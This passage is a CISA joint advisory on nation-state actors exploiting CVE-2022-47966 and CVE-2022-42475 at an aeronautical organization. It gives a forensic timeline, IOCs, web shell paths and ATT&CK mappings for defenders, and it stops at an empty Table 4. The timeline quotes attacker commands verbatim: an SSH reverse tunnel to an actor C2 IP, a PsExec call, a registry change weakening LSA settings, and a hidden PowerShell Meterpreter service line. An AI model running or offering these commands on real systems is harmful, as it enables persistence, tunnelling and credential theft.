=== Content from www.cisa.gov_3592d5ba_20250111_143249.html ===

[Skip to main content](#main)

![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)

An official website of the United States government

Here’s how you know

Here’s how you know

![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)

**Official websites use .gov**

 A **.gov** website belongs to an official government organization in the United States.

![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)

**Secure .gov websites use HTTPS**

 A **lock** (LockA locked padlock) or **https://** means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Election Threat Updates](/topics/election-security/election-threat-updates)[#protect2024](/protect2024)[Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

[![Cybersecurity & Infrastructure Security Agency logo America’s Cyber Security Defense Agency National Coordinator For Critical Infrastructure Security and Resilience](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)

[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)

Search

Menu

![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)

Close

* Topics

  [Topics](/topics)

  [Cybersecurity Best Practices](/topics/cybersecurity-best-practices)

  [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)

  [Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)

  [Election Security](/topics/election-security)

  [Emergency Communications](/topics/emergency-communications)

  [Industrial Control Systems](/topics/industrial-control-systems)

  [Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)

  [Partnerships and Collaboration](/topics/partnerships-and-collaboration)

  [Physical Security](/topics/physical-security)

  [Risk Management](/topics/risk-management)

   [How can we help?](/audiences)
  [Government](/topics/government)[Educational Institutions](/topics/educational-institutions)[Industry](/topics/industry)[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial)[Individuals and Families](/topics/individuals-and-families)[Small and Medium Businesses](/topics/small-and-medium-businesses)[Find Help Locally](/audiences/find-help-locally)[Faith-Based Community](/audiences/faith-based-community)[Executives](/audiences/executives)[High-Risk Communities](/audiences/high-risk-communities)
* [Spotlight](/spotlight)
* Resources & Tools

  [Resources & Tools](/resources-tools)

  [All Resources & Tools](/resources-tools/all-resources-tools)

  [Services](/resources-tools/services)

  [Programs](/resources-tools/programs)

  [Resources](/resources-tools/resources)

  [Training](/resources-tools/training)

  [Groups](/resources-tools/groups)
* News & Events

  [News & Events](/news-events)

  [News](/news-events/news)

  [Events](/news-events/events)

  [Cybersecurity Alerts & Advisories](/news-events/cybersecurity-advisories)

  [Directives](/news-events/directives)

  [Request a CISA Speaker](/news-events/request-speaker)

  [Congressional Testimony](/news-events/congressional-testimony)

  [CISA Conferences](/cisa-conferences)

  [CISA Live!](/cisa-live)
* Careers

  [Careers](/careers)

  [Benefits & Perks](/careers/benefits-perks)

  [HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)

  [Hiring](/general-recruitment-and-hiring-faqs)

  [Resume & Application Tips](/careers/resume-application-tips)

  [Students & Recent Graduates](/students-recent-graduates-employment-opportunities)

  [Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)

  [Work @ CISA](/careers/work-cisa)
* About

  [About](/about)

  [Culture](/about/culture)

  [Divisions & Offices](/about/divisions-offices)

  [Regions](/about/regions)

  [Leadership](/about/leadership)

  [Doing Business with CISA](/doing-business-cisa)

  [Site Links](/site-links)

  [Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)

  [CISA GitHub](/cisa-github)

  [CISA Central](/cisa-central)

  [2024 Year In Review](/about/2024YIR)

  [Contact Us](/about/contact-us)

  [Subscribe](/about/contact-us/subscribe-updates-cisa)

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Election Threat Updates](/topics/election-security/election-threat-updates)[#protect2024](/protect2024)[Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

Breadcrumb

1. [Home](/)
2. [News & Events](/news-events)
3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)
4. [Cybersecurity Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94)

Share:

Cybersecurity Advisory
# Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475

Release DateSeptember 07, 2023
Alert CodeAA23-250A

 Related topics:
[Nation-State Cyber Actors](/topics/cyber-threats-and-advisories/nation-state-cyber-actors), [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)

#### Actions to take today to mitigate malicious cyber activity:

1. Patch all systems for known exploited vulnerabilities (KEVs), including firewall security appliances.
2. Monitor for unauthorized use of remote access software using endpoint detection tools.
3. Remove unnecessary (disabled) accounts and groups from the enterprise that are no longer needed, especially privileged accounts.

### **SUMMARY**

The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and Cyber National Mission Force (CNMF) identified the presence of indicators of compromise (IOCs) at an Aeronautical Sector organization as early as January 2023. Analysts confirmed that nation-state advanced persistent threat (APT) actors exploited [CVE-2022-47966](https://nvd.nist.gov/vuln/detail/CVE-2022-47966 "CVE-2022-47966") to gain unauthorized access to a public-facing application (Zoho ManageEngine ServiceDesk Plus), establish persistence, and move laterally through the network. This vulnerability allows for remote code execution on the ManageEngine application. Additional APT actors were also observed exploiting [CVE-2022-42475](https://nvd.nist.gov/vuln/detail/CVE-2022-42475 "CVE-2022-42475") to establish presence on the organization’s firewall device.

CISA and co-sealers are releasing this joint Cybersecurity Advisory (CSA) to provide network defenders with tactics, techniques, and procedures (TTPs), IOCs, and methods to detect and protect against similar exploitation.

Download the PDF version of this report:

[AA23-250A Actors Exploit CVE-2022-47966 and CVE-2022-42475](/sites/default/files/2023-09/aa23-250a-apt-actors-exploit-cve-2022-47966-and-cve-2022-42475_1.pdf)
(PDF, 681.49 KB
)

For a downloadable copy of IOCs, see:

[AA23-250A STIX XML](/sites/default/files/2023-09/AA23-250A.stix_.xml)
(XML, 69.24 KB
)

[AA23-250A STIX JSON](/sites/default/files/2023-09/AA23-250A%20Multiple%20Nation-State%20Threat%20Actors%20Exploit%20CVE-2022-47966%20and%20CVE-2022-42475.stix_.json)
(JSON, 69.89 KB
)

For a downloadable copy of the Malware Analysis Report (MAR) accompanying this CSA, see:

[MAR-10430311-1.v1 Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475](/sites/default/files/2023-09/MAR-10430311.c1.v1.CLEAR_.pdf)
(PDF, 385.49 KB
)

**Note:** This advisory uses the [MITRE ATT&CK® for Enterprise](https://attack.mitre.org/versions/v13/matrices/enterprise/ "Enterprise Matrix") framework, version 13. See Tables 3-13 for the APT actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations.

#### **Overview**

By request of the impacted organization, CISA conducted an incident response engagement from February to April 2023. CISA and co-sealers assess that beginning as early as January 2023, multiple nation-state APT actors were present on the organization’s network via at least two initial access vectors:

* **Initial Access Vector 1:** APT actors exploited CVE-2022-47966 to access the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus.
* **Initial Access Vector 2:** APT actors exploited CVE-2022-42475 to access the organization’s firewall device.

CISA and co-sealers identified an array of threat actor activity, to include overlapping TTPs across multiple APT actors. Per the activity conducted, APT actors often scan internet-facing devices for vulnerabilities that can be easily exploited. Firewall, virtual private networks (VPNs), and other edge network infrastructure continue to be of interest to malicious cyber actors. When targeted, they can be leveraged to expand targeted network access, serve as malicious infrastructure, or a mixture of both.

#### **APT Actor Activity**

##### *Initial Access Vector 1*

As early as January 2023, APT actors exploited CVE-2022-47966 [[T1190](https://attack.mitre.org/versions/v13/techniques/T1190/ "Exploit Public-Facing Application")] for initial access to the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus. CISA observed indications in log files that a connection to the known malicious IP address `192.142.226[.]153` was made as part of initial exploitation.

Through exploitation of CVE-2022-47966, APT actors achieved root level access on the web server and created a local user account [[T1136.001](https://attack.mitre.org/versions/v13/techniques/T1136/001/ "Create Account: Local Account")] named `Azure` with administrative privileges [[T1068](https://attack.mitre.org/versions/v13/techniques/T1068/ "Exploitation for Privilege Escalation")]. Actors were further able to download malware, enumerate the network, collect administrative user credentials, and move laterally through the organization’s network. CISA and co-sealers were unable to determine if proprietary information was accessed, altered, or exfiltrated. This was due to the organization not clearly defining where their data was centrally located and CISA having limited network sensor coverage.

##### *Initial Access Vector 2*

Additional APT actors exploited CVE-2022-42475 on the organization’s firewall device, which was indicated by multiple successful VPN connections from known-malicious IPs between February 1-16, 2023. It was identified that APT actors compromised and used disabled, legitimate administrative account credentials [[T1078.003](https://attack.mitre.org/versions/v13/techniques/T1078/003/ "Valid Accounts: Local Accounts")] from a previously hired contractor—of which the organization confirmed the user had been disabled prior to the observed activity.

Analysis identified that a common behavior for these threat actors was to use disabled administrative account credentials and delete logs from several critical servers in the environment [[T1070.001](https://attack.mitre.org/versions/v13/techniques/T1070/001/ "Indicator Removal: Clear Windows Event Logs")]. This prevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers were also unable to further track the activity due to the organization not having Network Address Translation (NAT) IP logging enabled.

APT actors initiated multiple Transport Layer Security (TLS)-encrypted sessions [[T1573.002](https://attack.mitre.org/versions/v13/techniques/T1573/002/)] on Transmission Control Protocol (TCP) port 10443 [[T1571](https://attack.mitre.org/versions/v13/techniques/T1571/)], indicating successful exchanges of data transfer from the firewall device. APT actors were observed connecting to the device from the following actor-controlled C2 IP addresses:

* `144.202.2[.]71`
* `207.246.105[.]240`
* `45.77.121[.]232`
* `47.90.240[.]218`

APT actors further leveraged legitimate credentials to move from the firewall to a web server, where multiple web shells were loaded—among other locations, such as the OWA server—into the following directories. **Note:** The following file paths to these web shells were received in coordination with a trusted third-party; however, the artifacts were not received for analysis.

* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\resource.aspx`
* `c:\inetpub\wwwroot\[REDACTED]\css\font-awesome\css\discover.ashx`
* `c:\inetpub\wwwroot\[REDACTED]\css\font-awesome\css\configlogin.ashx`
* `c:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\template\layouts\approveinfo.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\errorinfo.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.ashx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\error.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\infos.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info-1.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\new_list.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\errorinfo.aspx`
* `c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\lgnbotr.ashx`
* `c:\inetpub\passwordchange\0LECPNJYRH.aspx`
* `c:\inetpub\passwordchange\9ehj.aspx`
* `c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\servicesinfo.ashx`
* `c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\services.aspx`
* `c:\inetpub\redirectedSites\[REDACTED]\products\uns1fw.aspx`
* `c:\inetpub\redirectedSites\[REDACTED]\products\uns1ew.aspx`

The following IP addresses were identified as associated with the loaded web shells:

* `45.90.123[.]194`
* `154.6.91[.]26`
* `154.6.93[.]22`
* `154.6.93[.]5`
* `154.6.93[.]12`
* `154.6.93[.]32`
* `154.6.93[.]24`
* `184.170.241[.]27`
* `191.96.106[.]40`
* `102.129.145[.]232`

##### *Forensic Timeline of APT Actor Activity*

Tables 1 and 2 list the timeline of events discovered during the incident response, as well as tools used by the APT actors to conduct their operations, respectively. All timestamps are presented in Coordinated Universal Time (UTC).

*Table 1: Timeline of APT Actor Activity*
| **Timestamp (UTC)** | **Event** | **Description** |
| --- | --- | --- |
| 2023-01-18  11:57:02 | `Hello World` User-Agent string observed in 44 total events.  Uniform Resource Identifier (URI): `/cgi-bin/downloadFlile[.]cgi` | `Hello World`, the User-Agent string inside of the initiated HTTP request, was observed during communication between the organization’s web server and malicious command and control (C2) server IP `92.118.39[.]82` [[T1071.001](https://attack.mitre.org/versions/v13/techniques/T1071/001/ "Application Layer Protocol: Web Protocols")]. This string has been observed in open source as an initial step of the Mirai botnet to download malicious artifacts [[T1583.005](https://attack.mitre.org/versions/v13/techniques/T1583/005/ "Acquire Infrastructure: Botnet")].[[1](https://snort.org/rule_docs/1-58992 "SID 1:58992")] |
| 2023-01-20 | Attempts made to export three files; associated with malicious IP `192.142.226[.]153`. | APT actors attempted to export [[TA0009](https://attack.mitre.org/versions/v13/tactics/TA0009/ "Collection")], [[TA0010](https://attack.mitre.org/versions/v13/tactics/TA0010/ "Exfiltration")] three files, which were analyzed and identified as Local Security Authority Subsystem Service (LSASS) dump files. These files were renamed with `.zip` and `.gif` extensions to evade detection [[T1036.008](https://attack.mitre.org/versions/v13/techniques/T1036/008/ "Masquerading: Masquerade File Type")]. Analysis confirmed the APT actors were unsuccessful at exfiltrating these files:   * `wo_view_bg.zip` (09:06:37 UTC)\ * `wo_view_bg1.gif` (09:08:11 UTC) * `wo_view_bg2.gif` (09:19:43 UTC)   **Note:** If local administrative access is achieved on a victim host, dumping LSASS credentials may allow for lateral movement across the environment. This behavior was identified during the engagement and is detailed throughout Table 1. |
| 2023-01-20  16:51:05 | Successful web server exploitation via CVE-2022-47966. | Successful web server (Zoho ManageEngine ServiceDesk Plus) exploitation via CVE-2022-47966. |
| 2023-01-21  06:46:42 | `Azure` local user account with administrative permissions created. | A local user account with administrative permissions, named `Azure`, was created on the server hosting ServiceDesk Plus. |
| 2023-01-21  06:49:40 | LSASS dumped by `Azure` user. | The `Azure` user successfully accessed and dumped credentials stored in the process memory of LSASS for the Active Directory (AD) domain [[T1003.001](https://attack.mitre.org/versions/v13/techniques/T1003/001/ "OS Credential Dumping: LSASS Memory")].  **Note:** Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system. |
| 2023-01-21  06:50:59 | `Mimikatz.exe` downloaded via ConnectWise ScreenConnect. | The legitimate ConnectWise ScreenConnect client was utilized to connect to the ServiceDesk system, download `mimikatz.exe`, and execute malicious payloads to steal credentials [[T1219](https://attack.mitre.org/versions/v13/techniques/T1219/ "Remote Access Software")], [[T1588.002](https://attack.mitre.org/versions/v13/techniques/T1588/002/ "Obtain Capabilities: Tool")].  **Note:** ConnectWise ScreenConnect was observed in multiple locations within the organization’s environment, but the organization confirmed that it was not authorized software. Analysis assessed APT actors downloaded the legitimate software for malicious, illegitimate use prior to the download of `mimikatz.exe`. |
| 2023-01-21  07:34:32 | `Bitmap.exe` malware downloaded and designated to connect to C2 IP `179.60.147[.]4`. | `Azure` user account downloaded `bitmap.exe` to the ServiceDesk system to execute an obfuscated, embedded malicious payload from its C2 server [[T1027.009](https://attack.mitre.org/versions/v13/techniques/T1027/009/ "Obfuscated Files or Information: Embedded Payloads")]. This malware is identified as a variant of Metasploit (Meterpreter).  See MAR-10430311-1.v1 for additional details. |
| 2023-01-21  08:46:23 | Mimikatz credential dump files created. | Two files (`c:\windows\system32\fuu.txt, c:\windows\system32\jojo.txt`) were created as means for Mimikatz to dump/write credentials to disk on the ServiceDesk system [[T1003](https://attack.mitre.org/versions/v13/techniques/T1003/ "OS Credential Dumping")]. |
| 2023-01-21  09:25:58 | Legitimate files/applications `nmap.exe` and `npcap.exe` downloaded. | `Azure` user account downloaded `nmap.exe` [[T1018](https://attack.mitre.org/versions/v13/techniques/T1018/ "Remote System Discovery")] and `npcap.exe` [[T1040](https://attack.mitre.org/versions/v13/techniques/T1040/ "Network Sniffing")] to continue network and credential information gathering efforts. Though legitimate applications, APT actors used these files for illegitimate, malicious purposes.  **Note:** Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure. |
| 2023-01-21  13:56:14 | `ssh2.zip` downloaded by the `Azure` user account. | APT actors downloaded the file `ssh2.zip` via the `Azure` user account, which contained legitimate files that could have been leveraged for malicious purposes. When unzipped, the following files were extracted:   * `install-sshd.ps1 (script)` * `psexec.exe` * `sshd.exe` * `ssh.exe` * `ssh-sk-helper.exe` * `libcrypto.dll`   **Note:** CISA analyzed these files and did not identify the files as malicious. However, `ssh.exe` was downloaded to establish persistence on the ServiceDesk system via SSH [[T1133](https://attack.mitre.org/versions/v13/techniques/T1133/ "External Remote Services")] and is detailed in the scheduled task below. |
| 2023-01-21  14:02:45 | Ngrok token created, renamed to `ngrok.yml` config file, and Remote Desktop Protocol (RDP) connection established. | Ngrok was used to establish an RDP connection [[T1021.001](https://attack.mitre.org/versions/v13/techniques/T1021/001/ "Remote Services: Remote Desktop Protocol")]—another method of maintaining persistence on the ServiceDesk system. In this instance, Ngrok was used to establish a reverse proxy connection to the ServiceDesk system.  At the time of analysis, the firewall access control lists (ACLs) allowed all outbound connections. Considering APT actors utilized an outbound proxy, the RDP session was successfully established as the connection was initiated from the ServiceDesk system.  **Note:** RDP is a common feature in operating systems, which allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. |
| 2023-01-21  14:31:01 | SSH tools downloaded to establish reverse (remote) communication. | Three identified executables, which provide a command line interface with the compromised system, were observed in the following file system locations:   * `c:\windows\system32\ssh-shellhost.exe` * `c:\windows\system32\ssh-agent.exe` * `c:\windows\system32\ssh-add.exe`   While the files were not identified as malicious, they were loaded for malicious purposes. |
| 2023-01-21  14:33:11 | `license validf` scheduled task created to communicate with malicious IP `104.238.234[.]145`. | `license validf` scheduled task [[T1036.004](https://attack.mitre.org/versions/v13/techniques/T1036/004/ "Masquerading: Masquerade Task or Service")] was created to execute `ssh.exe` on a recurring basis on the ServiceDesk system [[T1053.005](https://attack.mitre.org/versions/v13/techniques/T1053/005/ "Scheduled Task/Job: Scheduled Task")]:  `c:\Windows\System32\ssh.exe -N -f -R 12100 sst@104.238.234.145 -p 443 -o StrictHostKeyChecking=no`  Analysis identified `ssh.exe` was used to establish a SSH reverse tunnel to the APT actors’ C2 with dynamic port forwarding [T1572]. This allowed the actors to send traffic from their C2 server into the environment and connect directly to other systems and resources. |
| 2023-01-21  14:51:49 | PsExec executed on the ServiceDesk system. | Analysis identified evidence and execution of two files (`PsExec.exe` and `psexec.exe`) on the ServiceDesk system. These files were determined to be benign.  APT actors utilized PsExec to create a scheduled task and force-store administrative credentials to the local machine.  `psexec.exe -i -s C:\Windows\System32\mmc.exe /s C:\Windows\System32\taskschd.msc`  `powershell New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`  **Note:** PsExec, a command line utility from Microsoft's Sysinternals Suite, is known to be used for lateral movement; evidence of lateral movement via PsExec has not been confirmed. |
| 2023-01-21  14:55:02 | ProcDump created on the ServiceDesk system. | ProcDump was created within the `c:\windows\system32\prc64.exe` directory. This was later identified as a method for enumerating running processes/applications [[T1057](https://attack.mitre.org/versions/v13/techniques/T1057/ "Process Discovery")] and dumping LSASS credentials. |
| 2023-01-24  15:07:18 | Apache Log4j exploit attempted against the ServiceDesk system. | APT actors attempted to exploit a known Apache Log4j vulnerability (CVE-2021-44228) in the ServiceDesk system but were unsuccessful. The two IPs and one domain associated with this exploitation attempt are:   * `80.85.241[.]15` * `68.177.56[.]38` * `main.cloudfronts[.]net` |
| 2023-01-25  00:17:33 | Mimikatz credential dump files created. | One file (`c:\ManageEngine\ServiceDesk\bin\1.txt`) was created as a method for Mimikatz to dump/write credentials to disk on the ServiceDesk system.  **Note:** This is a different path and time associated with Mimikatz than listed above. |
| 2023-01-29 | HTTP-GET requests sent to C2 IP `92.118.39[.]82`. | The server hosting ServiceDesk was observed beaconing/sending HTTP-GET requests to a suspected APT-controlled C2 server, indicating malware was successfully implanted. |
| 2023-02-02  05:51:08 | `Resource.aspx` web shell detected. | Using additionally compromised, legitimate administrative credentials, APT actors logged into the Outlook Web Application (OWA) server from the ServiceDesk system. The actors dropped an Active Server Pages Extended (ASPX) web shell in the following file system location, which was designed to execute remote JavaScript code [[T1059.007](https://attack.mitre.org/versions/v13/techniques/T1059/007/ "Command and Scripting Interpreter: JavaScript")] on the OWA server [[T1505.003](https://attack.mitre.org/versions/v13/techniques/T1505/003/ "Server Software Component: Web Shell")]:   * `c:\Program Files\Microsoft Office Web Apps\RootWebSite\en-us\resource.aspx`   **Note:** The administrative user’s credentials were obtained from the APT actors’ collection (LSASS dump) of credentials from the entire AD domain. This user is separate from the actor-created `Azure` user account.  See MAR-10430311-1.v1 for additional details. |
| 2023-02-02  18:45:58 | Metasploit service installed. | APT actors installed Metasploit with the following attributes on the organization’s domain controller [[T1059.001](https://attack.mitre.org/versions/v13/techniques/T1059/001/)]:   * Service Name: `QrrCvbrvnxasKTSb` [[T1543.003](https://attack.mitre.org/versions/v13/techniques/T1543/003/)] * Service File Name: `%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &amp;quot;if([IntPtr]::Size -eq 4)` [[T1564.003](https://attack.mitre.org/versions/v13/techniques/T1564/003/ "Hide Artifacts: Hidden Window")]   **Note:** Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform several actions, including discovery of information and execution of code. |
| 2023-02-03  03:27:59 | `ConfigLogin.aspx` web shell detected. | APT actors dropped an additional ASPX web shell on a web server in the following file system location:   * `c:\inetpub\wwwrot\[REDACTED]\css\font-awesome\css\ConfigLogin.aspx`   See MAR-10430311-1.v1 for additional details. |
| 2023-02-03  15:12:23 | `wkHPd.exe` created to communicate with malicious IP `108.62.118[.]160`. | APT actors created and used a variant of Metasploit (Meterpreter) on the ServiceDesk system, listed as `wkHPd.exe` [[T1587.001](https://attack.mitre.org/versions/v13/techniques/T1587/001/ "Develop Capabilities: Malware")]. This variant serves as an attack payload that runs an interactive shell and allows a malicious actor to control and execute code on a system.  See MAR-10430311-1.v1 for additional details. |
| 2023-02-08  08:56:35,  2023-02-09  20:19:59,  2023-03-04,  2023-03-18 | Hypertext Preprocessor (PHP) files uploaded via HTTP-POST request from malicious IP `193.142.146[.]226`. | PHP files were uploaded to the ServiceDesk system via HTTP-POST request. APT actors were observed writing 16 instances of the following files to disk:   * `[REDACTED]/wp-content/themes/seotheme/db.php` (12 instances) * `[REDACTED]/wp-content/plugins/ioptimization/IOptimize.php` (4 instances) |
| 2023-03-06  06:49:40 | `Interact.sh` | APT actors executed Domain Name System (DNS) scanning at an additional server (not the ServiceDesk system) and directed callback to the `Interact.sh` domain, which indicated the server was susceptible to a DNS-style attack [[T1046](https://attack.mitre.org/versions/v13/techniques/T1046/)].  Destination IP: `103.105.49[.]108` |

Post-engagement analysis was extended but analysts were unable to determine additional actions taken by the APT actors, likely due to a lack of sensor coverage and data unavailability. With the data available, it was determined APT actors used the tools listed in Table 2 during their operations.

*Table 2: Observed Tools Used by APT Actors*
| **Tool** | **Description** | **Observation** |
| --- | --- | --- |
| **Mimikatz** [[2](https://attack.mitre.org/versions/v13/software/S0002/ "Mimikatz")] | A credential dumping tool capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. | In addition to using Mimikatz for credential dumping, APT actors dumped the following Windows Registry Hive files:   * `sam.hiv` [[T1003.002](https://attack.mitre.org/versions/v13/techniques/T1003/002/ "OS Credential Dumping: Security Account Manager")] * `system.hiv` * `security.hiv`   These files were dumped to obtain registry information such as users on the system, data used by the operating system [[T1012](https://attack.mitre.org/versions/v13/techniques/T1012/ "Query Registry")], and installed programs. |
| **Ngrok** [[3](https://attack.mitre.org/versions/v11/software/S0508/ "Ngrok")] | Ngrok software operates by running a client process on the machine and creating a private connection tunnel to a designated open port. Ngrok delivers instant ingress to applications in any cloud, private network, or devices with authentication, load balancing, and other critical controls.  In recent years, Ngrok has been leveraged maliciously by a variety of threat actors, including use for persistence, lateral movement, and data exfiltration.[[4](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a "Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester")],[[5](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-294a "#StopRansomware: Daixin Team")],[[6](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a "#StopRansomware: LockBit 3.0")] | Using Ngrok as an external service, APT actors were able to gain access to and utilize the command line on victim systems.  **Note:** CISA and co-sealers have observed this commonly used commercial platform being abused by malicious actors to bypass typical firewall controls. Ngrok’s ability to tunnel RDP and other services securely over internet connections makes it a target for abuse by malicious actors. |
| **ProcDump** | A command-line application used to monitor processes and create crash dump files. A crash dump file contains the data loaded in memory at the time the dump was triggered. It is typically used for troubleshooting errors with an application or operating system. | APT actors used ProcDump to conduct reconnaissance and examine spawned processes (applications in use). This tool was also utilized as a utility for dumping credentials from the server hosting ServiceDesk Plus. |
| **Metasploit** | Metasploit is an open-source penetration testing software. | APT actors’ specific use of Meterpreter—an attack payload of Metasploit—serves as an interactive shell and allows threat actors to control and execute code on a system. |
| **Interact.sh** | An open-source tool for detecting external interactions (communication).[[7](https://github.com/projectdiscovery/interactsh "projectdiscovery / interactsh")] This tool is used to detect callbacks from target systems for specified vulnerabilities and commonly used during the reconnaissance stages of adversary activity. | APT actors likely used `Interact.sh` to refrain from using and disclosing their own C2 infrastructure. |
| **anydesk.exe** | A remote desktop application that provides platform-independent remote access to personal computers and other devices running the host application. It offers remote control, file transfer, and VPN functionality. | Between early-February and mid-March 2023, `anydesk.exe` was observed on three hosts with different certificate issuers and hashes—none of which were the certified issuer [[T1553.002](https://attack.mitre.org/versions/v13/techniques/T1553/002/ "Subvert Trust Controls: Code Signing")]. APT actors compromised one host and moved laterally to install the executable on the remaining two [[T1570](https://attack.mitre.org/versions/v13/techniques/T1570/ "Lateral Tool Transfer")]—listed in order of time, as follows:   * `c:\programdata\anydesk.exe` * `c:\Users\[REDACTED]\Downloads\AnyDesk.exe` * `c:\Users\[REDACTED]\Documents\personal\program\AnyDesk.exe`   **Note:** Analysts confirmed APT actors’ weaponized use of `anydesk.exe` but were unable to confirm how the software was installed on each host. |
| **quser.exe** | A valid program on Windows machines that displays information about user sessions on a Remote Desktop Session Host server [[T1049](https://attack.mitre.org/versions/v13/techniques/T1049/ "System Network Connections Discovery")], including the name of the user, name of the session on the remote desktop session host server, session ID, state of the session (active or disconnected), idle time (number of minutes since last keystroke or mouse movement), and date/time the user logged on.[[8](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/quser "quser")] | APT actors were observed using this tool as early as March 2023 across four locations with the same name but different hashes (one of which is associated with the Portuguese [Brazil] language pack):  `c:\ProgramFiles\WindowsApps\Microsoft.LanguageExperiencePackpt-BR_19041.56.186.0_neutral__8wekyb3d8bbwe\Windows\System32\pt-BR` |
| **xpack.exe** | A custom `.NET` loader that decrypts (AES), loads, and executes accompanying files. | `Xpack.exe` indicators were present on multiple organization hosts, with an unverified user account observed navigating to the sites: `xpack.github[.]io` and `xpack.disqus[.]com`. Additionally, one administrator account and multiple user accounts were observed executing the xpack.exe file from a hidden directory [[T1564.001](https://attack.mitre.org/versions/v13/techniques/T1564/001/ "Hide Artifacts: Hidden Files and Directories")]:  `c:\USERS\[REDACTED]\.P2\POOL\PLUGINS\ORG.ECLIPSE.EMBEDCDT.TEMPLATES.XPACK_6.3.1.202210101738`  This malware was predominantly used to execute system commands, drop additional malware and tools, and stage data for exfiltration [[T1074](https://attack.mitre.org/versions/v13/techniques/T1074/ "Data Staged")]. **Note:** The data exfiltrated is unknown. |

### **MITRE ATT&CK TACTICS AND TECHNIQUES**

See Tables 3-13 for all referenced APT actors’ tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s [Best Practices for MITRE ATT&CK Mapping](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping "Best Practices for MITRE ATT&CK® Mapping") and CISA’s [Decider Tool](https://github.com/cisagov/Decider/ "cisagov / decider").

*Table 3: Resource Development*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Acquire Infrastructure: Botnet | [T1583.005](https://attack.mitre.org/versions/v13/techniques/T1583/005/ "Acquire Infrastructure: Botnet") | Actors used User-Agent string `Hello World` as an initial step of the Mirai botnet to later download malicious artifacts. |
| Develop Capabilities: Malware | [T1587.001](https://attack.mitre.org/versions/v13/techniques/T1587/001/ "Develop Capabilities: Malware") | Actors created and used a variant of Metasploit (Meterpreter) on the ServiceDesk system, listed as `wkHPd.exe`. This malware serves as an attack payload that runs an interactive shell; it allows for control and code execution on a system. |
| Obtain Capabilities: Exploits | [T1588.002](https://attack.mitre.org/versions/v13/techniques/T1588/002/ "Obtain Capabilities: Tool") | Actors leveraged the legitimate ConnectWise ScreenConnect client to download and utilize the credential dumping tool, `mimikatz.exe`. |

*Table 4: Initial Access*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
